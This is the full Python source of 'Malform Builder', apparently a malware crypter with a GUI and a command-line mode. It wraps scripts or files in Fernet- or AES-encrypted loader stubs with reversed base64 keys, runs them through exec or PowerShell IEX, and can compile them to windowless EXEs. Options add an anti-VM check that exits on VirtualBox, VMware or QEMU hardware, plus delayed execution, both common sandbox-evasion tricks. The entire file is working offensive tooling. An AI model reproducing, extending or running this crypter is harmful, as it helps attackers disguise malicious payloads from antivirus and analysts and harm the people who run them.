import os
import sys
import base64
import subprocess
import threading
import time
import zlib
import argparse
import customtkinter as ctk
from tkinter.filedialog import askopenfilename, asksaveasfilename
from tkinter import messagebox
from cryptography.fernet import Fernet
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# GUI Theme
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

APP_NAME = "Malform Builder"
VERSION = "1.2.2"

PHILOSOPHICAL_PHRASE = "Hide truths, reveal nothing."

class MalformBuilder(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title(f"{APP_NAME} v{VERSION}")
        self.geometry("620x550")

        # Header
        header = ctk.CTkLabel(self, text="🔧 Malform Builder", font=("Courier New", 24))
        header.pack(pady=(10, 0))
        subtitle = ctk.CTkLabel(self, text=PHILOSOPHICAL_PHRASE, font=("Courier New", 14), text_color="gray")
        subtitle.pack(pady=(0, 10))

        # Tabview
        self.tabs = ctk.CTkTabview(self, width=600, height=380)
        self.tabs.add("File")
        self.tabs.add("Text")
        self.tabs.add("PDF")
        self.tabs.pack(pady=10)

        # File Tab
        file_tab = self.tabs.tab("File")
        self.file_entry = ctk.CTkEntry(file_tab, placeholder_text="Select script file (.py/.ps1)...", width=400)
        self.file_entry.grid(row=0, column=0, padx=10, pady=10)
        ctk.CTkButton(file_tab, text="Browse", command=self._browse_file).grid(row=0, column=1)

        # File options
        self.file_method = ctk.CTkOptionMenu(file_tab, values=["Fernet", "AES-CBC", "Powershell"])
        self.file_method.set("Fernet")
        self.file_method.grid(row=1, column=0, pady=5, padx=10, sticky="w")
        self.file_opt_frame = ctk.CTkFrame(file_tab)
        self.file_opt_frame.grid(row=2, column=0, columnspan=2, pady=5)
        self.chk_anti_vm = ctk.CTkCheckBox(self.file_opt_frame, text="☠ Anti‑VM")
        self.chk_anti_vm.grid(row=0, column=0, padx=10, pady=5)
        self.chk_delay = ctk.CTkCheckBox(self.file_opt_frame, text="⏱ Delay Exec")
        self.chk_delay.grid(row=0, column=1, padx=10)
        self.delay_entry = ctk.CTkEntry(self.file_opt_frame, placeholder_text="secs", width=80)
        self.delay_entry.grid(row=0, column=2, padx=5)
        self.chk_compile = ctk.CTkCheckBox(self.file_opt_frame, text="📦 Auto‑EXE")
        self.chk_compile.grid(row=0, column=3, padx=10)
        self.chk_verbose = ctk.CTkCheckBox(self.file_opt_frame, text="🔍 Verbose Build")
        self.chk_verbose.grid(row=0, column=4, padx=10)

        ctk.CTkButton(file_tab, text="🔨 Build File", command=self._build_file).grid(
            row=3, column=0, columnspan=2, pady=10
        )

        # Text Tab
        text_tab = self.tabs.tab("Text")
        self.text_area = ctk.CTkTextbox(text_tab, width=560, height=200)
        self.text_area.grid(row=0, column=0, columnspan=2, padx=10, pady=10)
        self.text_method = ctk.CTkOptionMenu(text_tab, values=["Fernet", "AES-CBC"])
        self.text_method.set("Fernet")
        self.text_method.grid(row=1, column=0, pady=5, padx=10, sticky="w")
        ctk.CTkButton(text_tab, text="🔨 Build Text", command=self._build_text).grid(
            row=1, column=1, padx=10
        )

        # PDF Tab
        pdf_tab = self.tabs.tab("PDF")
        self.pdf_entry = ctk.CTkEntry(pdf_tab, placeholder_text="Select .pdf file...", width=400)
        self.pdf_entry.grid(row=0, column=0, padx=10, pady=10)
        ctk.CTkButton(pdf_tab, text="Browse", command=self._browse_pdf).grid(row=0, column=1)
        self.pdf_method = ctk.CTkOptionMenu(pdf_tab, values=["Fernet", "AES-CBC"])
        self.pdf_method.set("Fernet")
        self.pdf_method.grid(row=1, column=0, pady=5, padx=10, sticky="w")
        ctk.CTkButton(pdf_tab, text="🔨 Build PDF", command=self._build_pdf).grid(row=1, column=1, padx=10)

        # Status Bar
        self.status = ctk.CTkLabel(self, text="Ready...", text_color="green")
        self.status.pack(pady=10)

    def _browse_file(self):
        path = askopenfilename(filetypes=[("Scripts", "*.py *.ps1")])
        if path:
            self.file_entry.delete(0, 'end')
            self.file_entry.insert(0, path)

    def _browse_pdf(self):
        path = askopenfilename(filetypes=[("PDF files", "*.pdf")])
        if path:
            self.pdf_entry.delete(0, 'end')
            self.pdf_entry.insert(0, path)

    def _build_file(self):
        infile = self.file_entry.get()
        if not os.path.isfile(infile):
            return self._error("Invalid script file.")
        data = open(infile, 'rb').read()
        method = self.file_method.get()
        anti_vm = self.chk_anti_vm.get()
        delay = None
        if self.chk_delay.get():
            try:
                delay = int(self.delay_entry.get())
            except ValueError:
                return self._error("Delay must be integer.")
        # select stub creator
        if method == "Powershell":
            stub = self._create_ps_stub(data)
            out = asksaveasfilename(defaultextension=".ps1", filetypes=[("Powershell", "*.ps1")])
        else:
            stub = self._create_stub(data, method, anti_vm=anti_vm, delay=delay)
            out = asksaveasfilename(defaultextension=".py", filetypes=[("Python", "*.py")])
        if not out:
            return
        open(out, 'wb').write(stub)
        if method != "Powershell" and self.chk_compile.get():
            args = ["pyinstaller", "--onefile", "--noconsole"]
            if self.chk_verbose.get(): args += ["--log-level=DEBUG"]
            args.append(out)
            threading.Thread(target=self._compile_exe, args=(args,), daemon=True).start()
        self.status.configure(text="File built 💀", text_color="white")

    def _build_text(self):
        txt = self.text_area.get("0.0", ctk.END).encode('utf-8')
        if not txt.strip():
            return self._error("No text input.")
        method = self.text_method.get()
        stub = self._create_stub(txt, method, anti_vm=False, delay=None)
        out = asksaveasfilename(defaultextension=".txt", filetypes=[("Text", "*.txt")])
        if not out:
            return
        open(out, 'w').write(stub.decode())
        self.status.configure(text="Text built 📄", text_color="white")

    def _build_pdf(self):
        infile = self.pdf_entry.get()
        if not os.path.isfile(infile):
            return self._error("Invalid PDF file.")
        data = open(infile, 'rb').read()
        method = self.pdf_method.get()
        anti_vm = self.chk_anti_vm.get()
        delay = None
        if self.chk_delay.get():
            try:
                delay = int(self.delay_entry.get())
            except ValueError:
                return self._error("Delay must be integer.")
        stub = self._create_stub(data, method, anti_vm=anti_vm, delay=delay)
        out = asksaveasfilename(defaultextension=".py", filetypes=[("Python", "*.py")])
        if not out:
            return
        open(out, 'wb').write(stub)
        if self.chk_compile.get():
            args = ["pyinstaller", "--onefile", "--noconsole"]
            if self.chk_verbose.get(): args += ["--log-level=DEBUG"]
            args.append(out)
            threading.Thread(target=self._compile_exe, args=(args,), daemon=True).start()
        self.status.configure(text="PDF built 📚", text_color="white")

    def _create_stub(self, data: bytes, method: str, anti_vm: bool, delay: int) -> bytes:
        comp = zlib.compress(data)
        lines = ["import sys, base64, zlib"]
        if anti_vm:
            lines.append(
                "import os; info = os.popen(\"wmic baseboard get manufacturer,product\").read().upper();"
                " from sys import exit; vm_signs=['VBOX','VMWARE','QEMU'];"
                " [exit() for vm in vm_signs if vm in info]"
            )
        if delay and delay > 0:
            lines.append(f"import time; time.sleep({delay})")

        if method == "Fernet":
            key = Fernet.generate_key()
            token = Fernet(key).encrypt(comp)
            obf = base64.b64encode(key).decode()[::-1]
            lines.append(f"key = base64.b64decode('{obf}'[::-1])")
            lines.append(f"comp = {repr(token)}")
            lines.append("from cryptography.fernet import Fernet")
            lines.append("payload = zlib.decompress(Fernet(key).decrypt(comp))")
        else:
            key = os.urandom(32)
            iv = os.urandom(16)
            cipher = AES.new(key, AES.MODE_CBC, iv)
            enc = cipher.encrypt(pad(comp, AES.block_size))
            blob = base64.b64encode(key + iv + enc).decode()[::-1]
            lines.append(f"blob = base64.b64decode('{blob}'[::-1])")
            lines.append("from Crypto.Cipher import AES; from Crypto.Util.Padding import unpad")
            lines.append("key, iv, comp = blob[:32], blob[32:48], blob[48:]")
            lines.append("cipher = AES.new(key, AES.MODE_CBC, iv)")
            lines.append("payload = zlib.decompress(unpad(cipher.decrypt(comp), AES.block_size))")

        lines.append("exec(compile(payload.decode('utf-8'), '<string>', 'exec'))")
        return "\n".join(lines).encode()

    def _create_ps_stub(self, data: bytes) -> bytes:
        # Basic PS obfuscation: base64 unicode encode
        text = data.decode('utf-8')
        b64 = base64.b64encode(text.encode('utf-16-le')).decode()
        ps_stub = []
        ps_stub.append("$e='{0}'".format(b64))
        ps_stub.append(
            "$d=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($e))"
        )
        ps_stub.append("IEX $d")
        return ('\n'.join(ps_stub)).encode()

    def _compile_exe(self, args):
        self.status.configure(text="Compiling... 🔥")
        subprocess.call(args)
        self.status.configure(text="Compiled EXE 💾")

    def _error(self, msg):
        messagebox.showerror(APP_NAME, msg)
        self.status.configure(text=msg, text_color="red")


def run_cli():
    parser = argparse.ArgumentParser(description=f"{APP_NAME} v{VERSION} CLI mode")
    parser.add_argument("input", help="Input file (.py/.txt/.pdf/.ps1)")
    parser.add_argument("-m", "--method", choices=["Fernet","AES-CBC","Powershell"], default="Fernet")
    parser.add_argument("-o", "--output", help="Output file")
    parser.add_argument("--anti-vm", action="store_true")
    parser.add_argument("--delay", type=int, default=0)
    parser.add_argument("--verbose", action="store_true")
    args = parser.parse_args()
    if not os.path.isfile(args.input):
        print("Invalid input file.")
        sys.exit(1)
    data = open(args.input, 'rb').read()
    if args.method == "Powershell":
        stub = MalformBuilder()._create_ps_stub(data)
    else:
        stub = MalformBuilder()._create_stub(data, args.method, args.anti_vm, args.delay)
    out = args.output or (os.path.splitext(args.input)[0] + '_stub')
    if args.method == "Powershell": out += '.ps1'
    elif args.input.endswith('.py'): out += '.py'
    else: out += '_stub.py'
    open(out, 'wb').write(stub)
    print(f"Built stub: {out}")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        run_cli()
    else:
        app = MalformBuilder()
        app.mainloop()